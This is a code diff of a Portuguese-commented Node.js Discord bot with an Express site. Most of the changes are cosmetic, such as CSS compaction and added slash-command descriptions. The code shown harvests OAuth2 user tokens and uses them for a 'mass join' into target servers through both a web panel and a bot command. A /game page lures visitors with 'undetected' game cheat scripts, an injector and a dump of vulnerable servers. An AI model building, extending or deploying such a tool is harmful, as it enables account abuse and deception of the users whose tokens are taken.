@@ -9,7 +9,7 @@ const {
 
 // --- CONFIGURAÇÕES ---
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-const REDIRECT_TARGET = 'https://gamedown.onrender.com/sucess'; // Link final após verificar
+const REDIRECT_TARGET = 'https://gamedown.onrender.com/sucess'; 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
 
 // --- SETUP DO BANCO (POSTGRES) ---
@@ -43,10 +43,10 @@ app.use(express.json());
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 // =================================================================
-// ÁREA DO SITE (WEB DASHBOARD + GAME)
+// ÁREA DAS ROTAS DO SITE
 // =================================================================
 
-// 1. Rota Principal
+// 1. Rota Principal (Home)
 app.get('/', async (req, res) => {
     let count = 0;
     if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
@@ -62,7 +62,7 @@ app.get('/', async (req, res) => {
     `);
 });
 
-// 2. NOVA ROTA: /GAME (O Site que você pediu)
+// 2. Rota /GAME
 app.get('/game', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -73,109 +73,41 @@ app.get('/game', (req, res) => {
             <title>Game Hub - Exclusive Content</title>
             <style>
                 @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');
-                
-                body {
-                    margin: 0;
-                    padding: 0;
-                    background-color: #0f0f13;
-                    color: white;
-                    font-family: 'Rajdhani', sans-serif;
-                    overflow-x: hidden;
-                }
-
-                .hero {
-                    height: 100vh;
-                    display: flex;
-                    flex-direction: column;
-                    justify-content: center;
-                    align-items: center;
-                    background: radial-gradient(circle at center, #1a1b26 0%, #0f0f13 100%);
-                    text-align: center;
-                    padding: 20px;
-                }
-
-                h1 {
-                    font-size: 4rem;
-                    margin-bottom: 10px;
-                    text-transform: uppercase;
-                    background: linear-gradient(90deg, #00f260, #0575E6);
-                    -webkit-background-clip: text;
-                    -webkit-text-fill-color: transparent;
-                    text-shadow: 0 0 30px rgba(5, 117, 230, 0.3);
-                }
-
-                p {
-                    font-size: 1.2rem;
-                    color: #a0a0a0;
-                    max-width: 600px;
-                    margin-bottom: 40px;
-                }
-
-                .grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-                    gap: 20px;
-                    width: 100%;
-                    max-width: 1000px;
-                }
-
-                .card {
-                    background: rgba(255, 255, 255, 0.05);
-                    border: 1px solid rgba(255, 255, 255, 0.1);
-                    padding: 30px;
-                    border-radius: 12px;
-                    transition: 0.3s;
-                    cursor: pointer;
-                }
-
-                .card:hover {
-                    transform: translateY(-10px);
-                    background: rgba(255, 255, 255, 0.1);
-                    border-color: #00f260;
-                    box-shadow: 0 0 20px rgba(0, 242, 96, 0.2);
-                }
-
+                body { margin: 0; padding: 0; background-color: #0f0f13; color: white; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
+                .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle at center, #1a1b26 0%, #0f0f13 100%); text-align: center; padding: 40px 20px; }
+                h1 { font-size: 4rem; margin-bottom: 10px; text-transform: uppercase; background: linear-gradient(90deg, #00f260, #0575E6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 30px rgba(5, 117, 230, 0.3); }
+                p { font-size: 1.2rem; color: #a0a0a0; max-width: 600px; margin-bottom: 40px; }
+                .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; width: 100%; max-width: 1000px; }
+                .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; transition: 0.3s; cursor: pointer; }
+                .card:hover { transform: translateY(-10px); background: rgba(255, 255, 255, 0.1); border-color: #00f260; box-shadow: 0 0 20px rgba(0, 242, 96, 0.2); }
                 .card h3 { font-size: 1.5rem; margin-top: 0; }
-                .card span { color: #00f260; font-weight: bold; }
-
-                .btn {
-                    margin-top: 20px;
-                    display: inline-block;
-                    padding: 10px 25px;
-                    background: #5865F2;
-                    color: white;
-                    text-decoration: none;
-                    border-radius: 4px;
-                    font-weight: bold;
-                }
+                .card span { color: #00f260; font-weight: bold; display: block; margin: 10px 0; }
+                .btn { margin-top: 10px; display: inline-block; padding: 10px 25px; background: #5865F2; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; transition: 0.2s; }
+                .btn:hover { background: #4752c4; }
             </style>
         </head>
         <body>
             <div class="hero">
                 <h1>Game Hub</h1>
                 <p>Acesse scripts exclusivos, ferramentas beta e conteúdos vazados diretamente da nossa base de dados segura.</p>
-                
                 <div class="grid">
                     <div class="card">
                         <h3>Script Blox Fruits</h3>
                         <p>Auto farm, Auto raid e ESP.</p>
                         <span>STATUS: UNDETECTED 🟢</span>
-                        <br>
                         <a href="#" class="btn">Baixar</a>
                     </div>
                     <div class="card">
                         <h3>Executor PC</h3>
                         <p>Injetor level 8 sem key.</p>
                         <span>STATUS: ATUALIZADO 🟠</span>
-                        <br>
                         <a href="#" class="btn">Acessar</a>
                     </div>
                     <div class="card">
                         <h3>Database Dump</h3>
                         <p>Lista de servidores vulneráveis.</p>
                         <span>STATUS: VIP ONLY 🔒</span>
-                        <br>
-                        <a href="#" class="btn" style="background:#333">Bloqueado</a>
+                        <a href="#" class="btn" style="background:#333; cursor: not-allowed;">Bloqueado</a>
                     </div>
                 </div>
             </div>
@@ -184,7 +116,7 @@ app.get('/game', (req, res) => {
     `);
 });
 
-// 3. Rota do Painel Admin
+// 3. Rota /PAINEL (Admin)
 app.get('/painel', async (req, res) => {
     let count = 0;
     if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
@@ -260,7 +192,7 @@ app.post('/api/mass-join', async (req, res) => {
     if (logChannel) logChannel.send({ embeds: [new EmbedBuilder().setTitle('🖥️ Painel Web').setDescription(`**Alvo:** \`${serverId}\`\n**Sucesso:** ${sucesso}\n**Falha:** ${falha}`).setColor('Green')] });
 });
 
-// 5. Callback OAuth2 (Verificação + Redirecionamento 0.3s)
+// 5. Callback OAuth2
 app.get('/callback', async (req, res) => {
     const { code, state } = req.query; 
     if (!code) return res.send('Erro: Falta código.');
@@ -294,7 +226,6 @@ app.get('/callback', async (req, res) => {
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token').setDescription(`**${user.username}**`).setColor('Blue')] });
 
-        // PÁGINA DE REDIRECIONAMENTO RÁPIDO (0.3s)
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
@@ -320,10 +251,44 @@ app.get('/callback', async (req, res) => {
 // --- BOT ---
 client.once('ready', async () => {
     console.log(`🤖 Bot Logado: ${client.user.tag}`);
+    
+    // Tenta atualizar o status
+    if (pool) {
+        try {
+            const res = await pool.query('SELECT COUNT(*) FROM auth_users');
+            const total = res.rows[0].count;
+            client.user.setActivity(`${total} usuários`, { type: ActivityType.Watching });
+        } catch (e) {}
+    }
+
+    // --- AQUI ESTAVA O ERRO: AGORA COM DESCRIPTIONS ---
     await client.application.commands.set([
-        { name: 'setup_auth', description: 'Painel Auth' },
-        { name: 'estoque', description: 'Ver quantidade salva' },
-        { name: 'enviar', description: 'Mass Join via Comando', options: [{name:'quantidade',type:4,required:true},{name:'servidor_id',type:3,required:true}] }
+        { 
+            name: 'setup_auth', 
+            description: 'Painel Auth' 
+        },
+        { 
+            name: 'estoque', 
+            description: 'Ver quantidade salva' 
+        },
+        { 
+            name: 'enviar', 
+            description: 'Mass Join via Comando', 
+            options: [
+                { 
+                    name: 'quantidade', 
+                    description: 'Quantas pessoas enviar', // Corrigido
+                    type: 4, 
+                    required: true 
+                },
+                { 
+                    name: 'servidor_id', 
+                    description: 'ID do servidor de destino', // Corrigido
+                    type: 3, 
+                    required: true 
+                }
+            ] 
+        }
     ]);
 });
 
